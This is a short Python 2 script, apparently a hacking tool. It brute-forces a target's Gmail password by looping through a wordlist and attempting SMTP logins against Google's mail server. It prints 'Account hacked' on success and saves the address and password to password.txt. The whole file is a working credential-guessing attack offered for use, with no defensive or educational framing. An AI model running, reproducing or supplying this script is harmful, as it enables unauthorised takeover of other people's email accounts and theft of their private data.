import smtplib
import os
import sys


os.system("cls")
os.system("clear")
import acropolis
path = raw_input("Wordlist Path: ")
file = open(path,"r")
wordlist = file.readlines()
gmail = raw_input("Target Gmail: ")

server = smtplib.SMTP_SSL("smtp.googlemail.com", 465)
server.ehlo()

s=0
for password in wordlist:
    s=s+1
    print s,"/",len(wordlist)
    try:
        server.login(gmail,password)
        print "Account hacked password (saved on password.txt) --> ", password
        f = open("password.txt", "w")
        f.write("gmail: ")
        f.write(gmail)
        f.write("\n")
        f.write("password: ")
        f.write(password)
        f.close()
        break
    except smtplib.SMTPAuthenticationError as e:
        error = str(e)
        if error[14] == "<":
            print "Account hacked password (saved on password.txt) --> ", password
            f = open("password.txt", "w")
            f.write("gmail: ")
            f.write(gmail)
            f.write("\n")
            f.write("password: ")
            f.write(password)
            f.close()
            break
        else:
            pass
    
